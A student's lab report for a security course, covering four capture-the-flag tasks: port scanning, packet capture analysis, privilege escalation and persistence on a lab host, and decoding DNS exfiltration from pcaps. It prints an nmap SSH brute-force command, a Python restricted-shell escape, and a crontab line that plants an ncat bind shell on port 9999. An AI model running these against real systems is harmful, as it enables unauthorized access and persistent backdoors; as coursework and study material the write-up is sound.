# BSY Report

This is report for 4 tasks from BSY by Matous Dzivjak.

## 2. Finding Computers to Attack and Services.

In this task we had to scan local network for open ports and find a machine we could attack.
First device with open ports was router on 192.168.1.0 witch had admin web server.
We tried bruteforcing the password and username on the router but that didn't seem to work.
Finally we decided to try and scan elsewhere as the router probably wasn't meant to be targeted.

### Solution

After few runs finally this nmap command brought up some servers (excluding router) with non-22 ports open:

```
sudo nmap -sS -n -v 192.168.1.0/24 -p- -T5 --min-parallelism 200 --max-rtt-timeout 5 --max-retries 1 --max-scan-delay 0 --min-rate 1000
```

I noticed that if run without verbose flag nmap doesn't report on some ports which took a few hours from me.
The server with non-22 ports was 192.168.1.167. Some of the open ports were 22911, 8752, 13079, 26711.
Most of the returnes ASCII art, one of them also contained token `EuphoricMushroomsFeedAnywhere`, this token was then
requested by service on port 26711. We connected to this service using ncat:

```
ncat 192.168.1.167 26711
```

And upon being prompted for the token all that was needed was send this token as request. Response was the flag.

## 3. Detecting intruders using tcpdump and wireshark

This task was meant for us to strengten our skills with wireshark and tcpdump.

### Solution

We captured traffic using tcpdump for over 3 hours using:

```
nohup tcpdump -n -s0 -i eth0 -A port ! 22 &
```

Then we twiggled around with filtering to find out something interesting.
First we filtered out ssh traffic using

```
not ssh
```

Then we filtered the packets to keep only those for which we are the destination:

```
not ssh and ip.dst == 192.168.1.171
```

We saw a lot of port scans and other stuff happening so we filtered it out
to see only non-empty packets

```
not ssh and ip.dst == 192.168.1.171 and (udp.length > 0 or tcp.len > 0)
```

we also removed ICMP packets

```
not ssh and ip.dst == 192.168.1.171 and (udp.length > 0 or tcp.len > 0) and not icmp
```

This left us with 186 packets, after a quick visual scan we saw that some contain wierd
messages with "BEEP"s.

Finally, the whole BEEPING stream contained message encoded in morse code, e.g.
short BEEP standing for '.' and long BEEEPS standing for '-'. Decoded morse code
message contained token that needed to be written to the flag server (`192.168.1.167`) in order to obtain
the flag.

## 6: Privilege Escalation and Persistence

The task is simple: Get SSH access to moriarty@192.168.1.193 and find flag.
We are given a hint: Despite being a criminal mastermind, 
this person loves reading superhero comic books….. nerd!

So first we tried to bruteforce the password for user moriarty using the list
of 1000 most common passwords (https://raw.githubusercontent.com/DavidWittman/wpxmlrpcbrute/master/wordlists/1000-most-common-passwords.txt)
and command:

```
sudo nmap -sS -sV -p 22 192.168.1.193 -v -n --script ssh-brute --script-args userdb=names.txt,passdb=1000-most-common-passwords.txt
```

This sadly failed and didn't find the correct password.
So we tried to guess what the password might be and on the first try we get in;
the password was 'batman'.

After getting in we see, that we have only 2 command available, python and ls.
Using python we are able to spawn a shell:

```
import os; print(os.system('/bin/bash'))
```

After that, we could roam freely all over the server.
First thing we did was to have some persistence we added following line to crontab:

```
(crontab -l ; echo "@reboot sleep 200 && ncat -l 9999 -k -c /bin/bash")|crontab 2> /dev/null
```

Which will upon reboot spawn a shell acessible on port 9999.

After that, we explore more of what we can do. After a few minutes we stumble upon
folder assignment07 under /home/user which contains script for the 7th assignment.
In file password_rotator.sh we find whole script for the assignment from which we draw following conclusions:

1. The passwords that the user rotates are: "superman" "ironman" "batman" "4a7#mgannn2LDD90T#1fX#0Yx%m!kxrMSmUXd60xKwdM0S6u"

2. The file with second token is: /var/tmp/tokens/second_token.txt and it's content
changes to following values: "Hysterical" "Spaghetti" "Floss" "Apparently"
which together give the token for second part of the assignment: HystericalSpaghettiFlossApparently
This token is also in the first comment in the script
```
#TOKEN:HystericalSpaghettiFlossApparently
```

3. The flag server for second part of the assignment is 192.168.1.167:9453

4. On password rotation all ssh session to moriarty are killed so we won't be able
to persist our ssh connection but we can definitely spawn a remote shell which shouldn't
get killed by the script.

After looking into the /vat/tmp/tokens folder we find token and flag server for first part
of the task as well. We try to submit both flags but flag for token for the part B doesn't
work which we later get to know was unintentional.


## 9. Data exfiltration techniques and their detection

In this goal our task is to detect and analyze exfiltration in pcap files.

### 9.a

Upon visually inspecting the pcap we see that there are some long DNS TXT record queries.
We filtered those out using 'dns.txt' filter. Then we went to the flag server mentioned
in task description on `192.168.1.167:8991`.

The server prompted as with several questions:

```
What was the domain used for exfiltration? (input the last part of the subdomain and the TLD, e.g. google.com)
```

The answer to this can be found by simply viewing the TXT queries. The domain ends
with securitytesting.online and that is the answer.

```
<Legolas> Which type of DNS record was used?
```

As mentioned before the queries were of TXT type.

```
<Legolas> How many queries were used for the exfiltration in total?
```

The number of filtered out txt queries from INIT to last packet is 61.

After that we received our flag:

```
<Legolas> Your friends are with you: BSY-FLAG-A09A-{...}
```

### 9.b

In this task we see pcap of dns data exfiltration again. This time we know which tool
was used [DNSExfiltrator](https://github.com/Arno0x/DNSExfiltrator) and we have the
information that password 'pass' was used.

We again filtered the packets using `dns.txt` and copied out both packets that were
used for exfiltration:

```
init.ORSXG5BOOR4HI7BR.base64.securitytesting.online: type TXT, class IN
```

and

```
Name: 0.EIu3wCinsPK_RDCVv5d-28e2TU-Ec1BHT83QblPN3mOo-L1-dXVkSPod7iTczcQ.tlULhh7p_QqO-k4FtUQ56nkbgIOkTNePAkkDmEWAggVL7hEcLJpKORiesVBGsol.AEJgjlMn2JczQo6KGqUAJ4GtnaXI3YZW7uEel8fq0kjjJvQfVhtbHHKyx9bEhJO.zxhc39atS4.securitytesting.online
```

We cloned the repository with DNSExfiltrator and modified the code a bit to decode our string with fix password
without the need to run the whole process. After extracting the result zip file
we get folder with one single file: test.txt with following content:

```
lalalala
passwords: jkgjhqgfwgefjh
```

We then proceed to the flag server again, this time running on `192.168.1.167:8992`
First question:

```
<Gimli> What is the name of the exfiltrated file?
```

we already know the answer, the extracted file is `test.txt`

```
<Gimli> What is the password inside the file?
```

Answer is in the file: `jkgjhqgfwgefjh`

Answering these two questions was enough to get the flag:

```
<Gimli> Never thought I'd die fighting side by side with an Elf: BSY-FLAG-A09B-{...}
```


